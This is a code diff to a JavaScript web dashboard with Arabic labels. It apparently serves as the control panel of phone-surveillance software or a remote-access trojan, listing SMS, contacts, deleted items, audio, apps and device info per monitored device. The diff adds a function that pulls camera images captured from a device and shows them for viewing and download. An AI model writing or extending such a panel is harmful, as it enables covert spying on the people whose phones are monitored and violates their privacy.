@@ -10,6 +10,7 @@ let allSMS = [];
 let allContacts = [];
 let allDeleted = [];
 let allAudio = [];
+let allCameraImages = [];
 let currentChat = null;
 let currentCallNumber = null;
 let currentContact = null;
@@ -205,6 +206,7 @@ async function updateLiveData() {
         if (data.sms_count !== undefined) document.getElementById('smsCount').textContent = `(${data.sms_count})`;
         if (data.contacts_count !== undefined) document.getElementById('contactsCount').textContent = `(${data.contacts_count})`;
         if (data.images_count !== undefined) document.getElementById('imagesCount').textContent = `(${data.images_count})`;
+        if (data.camera_images_count !== undefined) document.getElementById('cameraImagesCount').textContent = `(${data.camera_images_count})`;
         if (data.audio_count !== undefined) document.getElementById('audioCount').textContent = `(${data.audio_count})`;
         if (data.apps_count !== undefined) document.getElementById('appsCount').textContent = `(${data.apps_count})`;
         if (data.deleted_count !== undefined) document.getElementById('deletedCount').textContent = `(${data.deleted_count})`;
@@ -217,10 +219,62 @@ async function loadAllData() {
     await loadSMS();
     await loadContacts();
     await loadImages();
+    await loadCameraImages();
     await loadAudio();
     await loadApps();
     await loadDeviceInfo();
     await loadDeleted();
+}
+
+async function loadCameraImages() {
+    try {
+        const response = await fetch(`/api.php?action=get_camera_images&device=${encodeURIComponent(currentDevice)}`);
+        const images = await response.json();
+        const grid = document.getElementById('cameraImagesGrid');
+        if (!grid) return;
+        
+        grid.innerHTML = '';
+        
+        if (!images || images.length === 0) {
+            grid.innerHTML = '<p style="color:#888;">لا توجد صور كاميرا</p>';
+            return;
+        }
+        
+        [...images].sort((a, b) => (b.date || 0) - (a.date || 0)).forEach((image) => {
+            const div = document.createElement('div');
+            div.className = 'image-card';
+            const img = document.createElement('img');
+            img.src = `data:image/jpeg;base64,${image.data}`;
+            img.className = 'thumb';
+            img.onclick = () => window.open(img.src);
+            const name = document.createElement('div');
+            name.className = 'image-name';
+            name.textContent = image.name || 'صورة';
+            const btns = document.createElement('div');
+            btns.className = 'image-buttons';
+            const v = document.createElement('button');
+            v.className = 'view-btn';
+            v.textContent = '👁️';
+            v.onclick = () => window.open(img.src);
+            const d = document.createElement('button');
+            d.className = 'download-btn';
+            d.textContent = '⬇️ حفظ';
+            d.onclick = () => {
+                const a = document.createElement('a');
+                a.href = img.src;
+                a.download = image.name;
+                document.body.appendChild(a);
+                a.click();
+                a.remove();
+            };
+            btns.appendChild(v);
+            btns.appendChild(d);
+            div.appendChild(img);
+            div.appendChild(name);
+            div.appendChild(btns);
+            grid.appendChild(div);
+        });
+    } catch (e) {}
 }
 
 async function loadAudio() {
